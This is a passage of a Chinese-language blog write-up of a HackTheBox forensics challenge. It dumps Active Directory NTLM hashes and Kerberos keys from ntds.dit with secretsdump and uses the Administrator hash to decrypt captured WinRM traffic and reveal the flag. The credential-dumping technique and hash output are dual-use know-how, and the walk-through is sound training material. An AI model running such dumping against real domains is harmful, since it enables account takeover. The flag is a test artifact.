+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]</span><br><span class="line">└─<span class="comment"># secretsdump.py -ntds ntds.dit -system system.hive LOCAL</span></span><br><span class="line">Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x406124541b22fb571fb552e27e956557</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching <span class="keyword">for</span> pekList, be patient</span><br><span class="line">[*] PEK <span class="comment"># 0 found and decrypted: 9da98598be012bc4a476100a50a63409</span></span><br><span class="line">[*] Reading and decrypting hashes from ntds.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:8bb1f8635e5708eb95aedf142054fc95:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">CORP-DC$:1000:aad3b435b51404eeaad3b435b51404ee:94d5e7460c75a0b30d85744f633a0e66:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9555398600e2b2edf220d06a7c564e6f:::</span><br><span class="line">CORP.<span class="built_in">local</span>\fcastle:1103:aad3b435b51404eeaad3b435b51404ee:37fbc1731f66ad4e524160a732410f9d:::</span><br><span class="line">CORP.<span class="built_in">local</span>\jdoe:1104:aad3b435b51404eeaad3b435b51404ee:37fbc1731f66ad4e524160a732410f9d:::</span><br><span class="line">WS01$:1105:aad3b435b51404eeaad3b435b51404ee:cd9c49cc4a1a535d27b64ab23d58f3e6:::</span><br><span class="line">WS02$:1106:aad3b435b51404eeaad3b435b51404ee:98c3974cacc09721a351361504de4de5:::</span><br><span class="line">CORP.<span class="built_in">local</span>\asmith:1109:aad3b435b51404eeaad3b435b51404ee:acbfc03df96e93cf7294a01a6abbda33:::</span><br><span class="line">[*] Kerberos keys from ntds.dit </span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:6e5d1ccb7642b4bf855975702699f733034916dbd04bf4acddc36ac273b3f578</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:8d5709c4a7cab2e0f5fbb4a069b283fb</span><br><span class="line">Administrator:des-cbc-md5:e302c7793b58ae97</span><br><span class="line">CORP-DC$:aes256-cts-hmac-sha1-96:9c888129432a87257f81f6bb6affd91bc3b0ba9cf20e94ef9216364d79aab5bd</span><br><span class="line">CORP-DC$:aes128-cts-hmac-sha1-96:0ac3c714050469724e5c41d21f7f86d3</span><br><span class="line">CORP-DC$:des-cbc-md5:57497ce6972613da</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:85c670ece27dad635c28630454154bb325b644b8f61d44f802b80c39277f529e</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:15bfbb6b827c1904e49d77bf7624c2f4</span><br><span class="line">krbtgt:des-cbc-md5:a2074373b920515d</span><br><span class="line">CORP.<span class="built_in">local</span>\fcastle:aes256-cts-hmac-sha1-96:c6319d38d781e145161c4b1a4ef11d08ad9be36c43b173b355f78c2cf2edf15a</span><br><span class="line">CORP.<span class="built_in">local</span>\fcastle:aes128-cts-hmac-sha1-96:144565c25d70678535b2908983d74f6e</span><br><span class="line">CORP.<span class="built_in">local</span>\fcastle:des-cbc-md5:6b0b2f01a731a78f</span><br><span class="line">CORP.<span class="built_in">local</span>\jdoe:aes256-cts-hmac-sha1-96:9d74074381d0000525c1cfbb24c2943e28bf415b89c8cf958eae5add39614ac8</span><br><span class="line">CORP.<span class="built_in">local</span>\jdoe:aes128-cts-hmac-sha1-96:7e0fb5fa7dcfa50ea0a8a55e08b63f74</span><br><span class="line">CORP.<span class="built_in">local</span>\jdoe:des-cbc-md5:610e67019e9b68ab</span><br><span class="line">WS01$:aes256-cts-hmac-sha1-96:ccc215ff3ac06dc3e206f6e55cd1512f3bb00311d02c77591f3cb08e01d5a40f</span><br><span class="line">WS01$:aes128-cts-hmac-sha1-96:5e94401d7da953a13d42809340ff6ec3</span><br><span class="line">WS01$:des-cbc-md5:9885ea642f268ab3</span><br><span class="line">WS02$:aes256-cts-hmac-sha1-96:dc3f081be6c29532904a073124a0998d857667cc5c531fcbe0f6d3e46d40eac2</span><br><span class="line">WS02$:aes128-cts-hmac-sha1-96:7e494ea36b4fb80670f807a8c72e7b3d</span><br><span class="line">WS02$:des-cbc-md5:b58a08dc9eabbc0d</span><br><span class="line">CORP.<span class="built_in">local</span>\asmith:aes256-cts-hmac-sha1-96:57e22c0b740ed35935f82a6e34ab84a683437105a4ab2f1f3ba70962d5c53112</span><br><span class="line">CORP.<span class="built_in">local</span>\asmith:aes128-cts-hmac-sha1-96:392a638579d925cca9e4ef7965b9dcdd</span><br><span class="line">CORP.<span class="built_in">local</span>\asmith:des-cbc-md5:839bd6e9380e40f7</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic6.png"></li>
+</ul>
+<h1 id="解密winrm流量"><a href="#解密winrm流量" class="headerlink" title="解密winrm流量"></a>解密winrm流量</h1><p>当在base64编码的SYSTEM hive通过端口8080完成传输后立即查看流量时，可以看到加密的winrm流量，可以通过解密winrm流量来查看最后的flag。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp.stream eq 25</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic7.png"></li>
+</ul>
+<p>网上找到了一个据称可以解密winrm 流量的脚本，给出了密码的NTLM HASH，就现在来说，似乎很完美。然而，当试图运行脚本时，失败了。最终，问题似乎归结为未能将pcap捕获数据正确解析为字节。</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vamJvcmVhbjkzL2Q2ZmY1ZTg3ZjhhOWY1Y2IyMTVjZDQ5ODI2NTIzMDQ1I2ZpbGUtd2lucm1fZGVjcnlwdC1weQ==">file-winrm_decrypt-py<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>后面对第208行进行调整，向其中添加了”include_raw&#x3D;True, use_json&#x3D;True”，以及第248行，其中”file_data &#x3D; cap.http.file_data.binary_value”修改为”file_data &#x3D; cap.http.file_data_raw[0].binary_value”。下面是修改后的版本的github仓库地址:</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2g0c2g1L2RlY3J5cHQtd2lucm0=">decrypt-winrm<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<h1 id="解密winrm流量并获取最后的flag"><a href="#解密winrm流量并获取最后的flag" class="headerlink" title="解密winrm流量并获取最后的flag"></a>解密winrm流量并获取最后的flag</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]</span><br><span class="line">└─<span class="comment"># python3 /root/decrypt-winrm/winrm_decrypt.py -n 8bb1f8635e5708eb95aedf142054fc95 capture.pcap</span></span><br><span class="line">unwrap_initiate</span><br><span class="line">No: 21358 | Time: 2021-11-05T07:04:51.144128 | Source: 192.168.1.9 | Destination: 192.168.1.10</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="line">&lt;<span class="built_in">env</span>:Envelope xmlns:xsd=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xmlns:<span class="built_in">env</span>=<span class="string">&quot;http://www.w3.org/2003/05/soap-envelope&quot;</span> xmlns:a=<span class="string">&quot;http://schemas.xmlsoap.org/ws/2004/08/addressing&quot;</span> xmlns:b=<span class="string">&quot;http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd&quot;</span> xmlns:n=<span class="string">&quot;http://schemas.xmlsoap.org/ws/2004/09/enumeration&quot;</span> xmlns:x=<span class="string">&quot;http://schemas.xmlsoap.org/ws/2004/09/transfer&quot;</span> xmlns:w=<span class="string">&quot;http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd&quot;</span> xmlns:p=<span class="string">&quot;http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd&quot;</span> xmlns:rsp=<span class="string">&quot;http://schemas.microsoft.com/wbem/wsman/1/windows/shell&quot;</span> xmlns:cfg=<span class="string">&quot;http://schemas.microsoft.com/wbem/wsman/1/config&quot;</span>&gt;</span><br><span class="line">        &lt;<span class="built_in">env</span>:Header&gt;</span><br><span class="line">                &lt;a:To&gt;http://192.168.1.10:5985/wsman&lt;/a:To&gt;</span><br><span class="line">                &lt;a:ReplyTo&gt;</span><br><span class="line">                        &lt;a:Address mustUnderstand=<span class="string">&quot;true&quot;</span>&gt;http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous&lt;/a:Address&gt;</span><br><span class="line">                &lt;/a:ReplyTo&gt;</span><br><span class="line">                &lt;w:MaxEnvelopeSize mustUnderstand=<span class="string">&quot;true&quot;</span>&gt;153600&lt;/w:MaxEnvelopeSize&gt;</span><br><span class="line">                &lt;a:MessageID&gt;uuid:2E1BED84-B255-4285-9F46-23B3140DEC55&lt;/a:MessageID&gt;</span><br><span class="line">                &lt;p:SessionId mustUnderstand=<span class="string">&quot;false&quot;</span>&gt;uuid:0203E06F-B136-4239-AC80-80F196C3E994&lt;/p:SessionId&gt;</span><br><span class="line">                &lt;w:Locale xml:lang=<span class="string">&quot;en-US&quot;</span> mustUnderstand=<span class="string">&quot;false&quot;</span>/&gt;</span><br><span class="line">                &lt;p:DataLocale xml:lang=<span class="string">&quot;en-US&quot;</span> mustUnderstand=<span class="string">&quot;false&quot;</span>/&gt;</span><br><span class="line">                &lt;w:OperationTimeout&gt;PT60S&lt;/w:OperationTimeout&gt;</span><br><span class="line">                &lt;w:ResourceURI mustUnderstand=<span class="string">&quot;true&quot;</span>&gt;http://schemas.microsoft.com/wbem/wsman/1/config&lt;/w:ResourceURI&gt;</span><br><span class="line">                &lt;a:Action mustUnderstand=<span class="string">&quot;true&quot;</span>&gt;http://schemas.xmlsoap.org/ws/2004/09/transfer/Get&lt;/a:Action&gt;</span><br><span class="line">        &lt;/env:Header&gt;</span><br><span class="line">        &lt;<span class="built_in">env</span>:Body/&gt;</span><br><span class="line">&lt;/env:Envelope&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unwrap_accept</span><br><span class="line">No: 21360 | Time: 2021-11-05T07:04:51.150923 | Source: 192.168.1.10 | Destination: 192.168.1.9</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="line">&lt;s:Envelope xmlns:s=<span class="string">&quot;http://www.w3.org/2003/05/soap-envelope&quot;</span> xmlns:a=<span class="string">&quot;http://schemas.xmlsoap.org/ws/2004/08/addressing&quot;</span> xmlns:x=<span class="string">&quot;http://schemas.xmlsoap.org/ws/2004/09/transfer&quot;</span> xmlns:w=<span class="string">&quot;http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd&quot;</span> xmlns:p=<span class="string">&quot;http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd&quot;</span> xml:lang=<span class="string">&quot;en-US&quot;</span>&gt;</span><br><span class="line">        &lt;s:Header&gt;</span><br><span class="line">                &lt;a:Action&gt;http://schemas.xmlsoap.org/ws/2004/09/transfer/GetResponse&lt;/a:Action&gt;</span><br><span class="line">                &lt;a:MessageID&gt;uuid:7201F456-9480-4BDD-9CDE-993F1B5397D0&lt;/a:MessageID&gt;</span><br><span class="line">                &lt;a:To&gt;http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous&lt;/a:To&gt;</span><br><span class="line">                &lt;a:RelatesTo&gt;uuid:2E1BED84-B255-4285-9F46-23B3140DEC55&lt;/a:RelatesTo&gt;</span><br><span class="line">        &lt;/s:Header&gt;</span><br><span class="line">        &lt;s:Body&gt;</span><br><span class="line">                &lt;cfg:Config xmlns:cfg=<span class="string">&quot;http://schemas.microsoft.com/wbem/wsman/1/config&quot;</span>&gt;</span><br><span class="line">                        &lt;cfg:MaxEnvelopeSizekb&gt;500&lt;/cfg:MaxEnvelopeSizekb&gt;</span><br><span class="line">                        &lt;cfg:MaxTimeoutms&gt;60000&lt;/cfg:MaxTimeoutms&gt;</span><br><span class="line">                        &lt;cfg:MaxBatchItems&gt;32000&lt;/cfg:MaxBatchItems&gt;</span><br><span class="line">                        &lt;cfg:MaxProviderRequests&gt;4294967295&lt;/cfg:MaxProviderRequests&gt;</span><br><span class="line">                        &lt;cfg:Client&gt;</span><br><span class="line">                                &lt;cfg:NetworkDelayms&gt;5000&lt;/cfg:NetworkDelayms&gt;</span><br><span class="line">                                &lt;cfg:URLPrefix&gt;wsman&lt;/cfg:URLPrefix&gt;</span><br><span class="line">                                &lt;cfg:AllowUnencrypted&gt;<span class="literal">false</span>&lt;/cfg:AllowUnencrypted&gt;</span><br><span class="line">                                &lt;cfg:Auth&gt;</span><br><span class="line">                                        &lt;cfg:Basic&gt;<span class="literal">true</span>&lt;/cfg:Basic&gt;</span><br><span class="line">                                        &lt;cfg:Digest&gt;<span class="literal">true</span>&lt;/cfg:Digest&gt;</span><br><span class="line">                                        &lt;cfg:Kerberos&gt;<span class="literal">true</span>&lt;/cfg:Kerberos&gt;</span><br><span class="line">                                        &lt;cfg:Negotiate&gt;<span class="literal">true</span>&lt;/cfg:Negotiate&gt;</span><br><span class="line">                                        &lt;cfg:Certificate&gt;<span class="literal">true</span>&lt;/cfg:Certificate&gt;</span><br><span class="line">                                        &lt;cfg:CredSSP&gt;<span class="literal">false</span>&lt;/cfg:CredSSP&gt;</span><br><span class="line">                                &lt;/cfg:Auth&gt;</span><br><span class="line">                                &lt;cfg:DefaultPorts&gt;</span><br><span class="line">                                        &lt;cfg:HTTP&gt;5985&lt;/cfg:HTTP&gt;</span><br><span class="line">                                        &lt;cfg:HTTPS&gt;5986&lt;/cfg:HTTPS&gt;</span><br><span class="line">                                &lt;/cfg:DefaultPorts&gt;</span><br><span class="line">                                &lt;cfg:TrustedHosts/&gt;</span><br><span class="line">                        &lt;/cfg:Client&gt;</span><br><span class="line">                        &lt;cfg:Service&gt;</span><br><span class="line">                                &lt;cfg:RootSDDL&gt;O:NSG:BAD:P(A;;GA;;;BA)(A;;GR;;;IU)S:P(AU;FA;GA;;;WD)(AU;SA;GXGW;;;WD)&lt;/cfg:RootSDDL&gt;</span><br><span class="line">                                &lt;cfg:MaxConcurrentOperations&gt;4294967295&lt;/cfg:MaxConcurrentOperations&gt;</span><br><span class="line">                                &lt;cfg:MaxConcurrentOperationsPerUser&gt;1500&lt;/cfg:MaxConcurrentOperationsPerUser&gt;</span><br><span class="line">                                &lt;cfg:EnumerationTimeoutms&gt;240000&lt;/cfg:EnumerationTimeoutms&gt;</span><br><span class="line">                                &lt;cfg:MaxConnections&gt;300&lt;/cfg:MaxConnections&gt;</span><br><span class="line">                                &lt;cfg:MaxPacketRetrievalTimeSeconds&gt;120&lt;/cfg:MaxPacketRetrievalTimeSeconds&gt;</span><br><span class="line">                                &lt;cfg:AllowUnencrypted&gt;<span class="literal">false</span>&lt;/cfg:AllowUnencrypted&gt;</span><br><span class="line">                                &lt;cfg:Auth&gt;</span><br><span class="line">                                        &lt;cfg:Basic&gt;<span class="literal">false</span>&lt;/cfg:Basic&gt;</span><br><span class="line">                                        &lt;cfg:Kerberos&gt;<span class="literal">true</span>&lt;/cfg:Kerberos&gt;</span><br><span class="line">                                        &lt;cfg:Negotiate&gt;<span class="literal">true</span>&lt;/cfg:Negotiate&gt;</span><br><span class="line">                                        &lt;cfg:Certificate&gt;<span class="literal">false</span>&lt;/cfg:Certificate&gt;</span><br><span class="line">                                        &lt;cfg:CredSSP&gt;<span class="literal">false</span>&lt;/cfg:CredSSP&gt;</span><br><span class="line">                                        &lt;cfg:CbtHardeningLevel&gt;Relaxed&lt;/cfg:CbtHardeningLevel&gt;</span><br><span class="line">                                &lt;/cfg:Auth&gt;</span><br><span class="line">                                &lt;cfg:DefaultPorts&gt;</span><br><span class="line">                                        &lt;cfg:HTTP&gt;5985&lt;/cfg:HTTP&gt;</span><br><span class="line">                                        &lt;cfg:HTTPS&gt;5986&lt;/cfg:HTTPS&gt;</span><br><span class="line">                                &lt;/cfg:DefaultPorts&gt;</span><br><span class="line">                                &lt;cfg:IPv4Filter&gt;*&lt;/cfg:IPv4Filter&gt;</span><br><span class="line">                                &lt;cfg:IPv6Filter&gt;*&lt;/cfg:IPv6Filter&gt;</span><br><span class="line">                                &lt;cfg:EnableCompatibilityHttpListener&gt;<span class="literal">false</span>&lt;/cfg:EnableCompatibilityHttpListener&gt;</span><br><span class="line">                                &lt;cfg:EnableCompatibilityHttpsListener&gt;<span class="literal">false</span>&lt;/cfg:EnableCompatibilityHttpsListener&gt;</span><br><span class="line">                                &lt;cfg:CertificateThumbprint/&gt;</span><br><span class="line">                                &lt;cfg:AllowRemoteAccess&gt;<span class="literal">true</span>&lt;/cfg:AllowRemoteAccess&gt;</span><br><span class="line">                        &lt;/cfg:Service&gt;</span><br><span class="line">                        &lt;cfg:Winrs&gt;</span><br><span class="line">                                &lt;cfg:AllowRemoteShellAccess&gt;<span class="literal">true</span>&lt;/cfg:AllowRemoteShellAccess&gt;</span><br><span class="line">                                &lt;cfg:IdleTimeout&gt;7200000&lt;/cfg:IdleTimeout&gt;</span><br><span class="line">                                &lt;cfg:MaxConcurrentUsers&gt;2147483647&lt;/cfg:MaxConcurrentUsers&gt;</span><br><span class="line">                                &lt;cfg:MaxShellRunTime&gt;2147483647&lt;/cfg:MaxShellRunTime&gt;</span><br><span class="line">                                &lt;cfg:MaxProcessesPerShell&gt;2147483647&lt;/cfg:MaxProcessesPerShell&gt;</span><br><span class="line">                                &lt;cfg:MaxMemoryPerShellMB&gt;2147483647&lt;/cfg:MaxMemoryPerShellMB&gt;</span><br><span class="line">                                &lt;cfg:MaxShellsPerUser&gt;2147483647&lt;/cfg:MaxShellsPerUser&gt;</span><br><span class="line">                        &lt;/cfg:Winrs&gt;</span><br><span class="line">                &lt;/cfg:Config&gt;</span><br><span class="line">        &lt;/s:Body&gt;</span><br><span class="line">&lt;/s:Envelope&gt;</span><br><span class="line"></span><br><span class="line">......more......</span><br></pre></td></tr></table></figure>
+
+<p>获取最终flag，winrm流量解密成功：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]</span><br><span class="line">└─<span class="comment"># echo &quot;aHTB&#123;&quot; | base64                                                                                     </span></span><br><span class="line">YUhUQnsK</span><br><span class="line">                                                                                                                                          </span><br><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]</span><br><span class="line">└─<span class="comment"># python3 /root/decrypt-winrm/winrm_decrypt.py -n 8bb1f8635e5708eb95aedf142054fc95 capture.pcap | grep hUQn    </span></span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">                        &lt;rsp:Stream Name=<span class="string">&quot;stdout&quot;</span> CommandId=<span class="string">&quot;8937D38B-70EB-44FB-84C5-DB5752DA7E67&quot;</span>&gt;AAAAAAAAABoAAAAAAAAAAAMAAABeAQAAAAQQBACzrAetdF3OT7duxmQ4O6Yxi9M3ietw+0SExdtXUtp+Z++7vzxTPkhUQntuMHRoMW5nXzFzX3RydTNfM3Yzcnl0aDFuZ18xc19kM2NyeXB0M2R9PC9TPg==&lt;/rsp:Stream&gt;</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">unwrap_accept</span><br><span class="line">unwrap_initiate</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]</span><br><span class="line">└─<span class="comment"># echo AAAAAAAAABoAAAAAAAAAAAMAAABeAQAAAAQQBACzrAetdF3OT7duxmQ4O6Yxi9M3ietw+0SExdtXUtp+Z++7vzxTPkhUQntuMHRoMW5nXzFzX3RydTNfM3Yzcnl0aDFuZ18xc19kM2NyeXB0M2R9PC9TPg== | base64 -d</span></span><br><span class="line">▒^���t]�O�n�d8;�1��7��p�D���WR�~g&lt;S&gt;HTB&#123;n0th1ng_1s_tru3_3v3ryth1ng_1s_d3crypt3d&#125;&lt;/S&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic8.png"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic9.png"></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2022/01/05/decrypt-winrm-traffic/" title="从pcap包中解密Winrm流量">https://fdlucifer.github.io/2022/01/05/decrypt-winrm-traffic/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
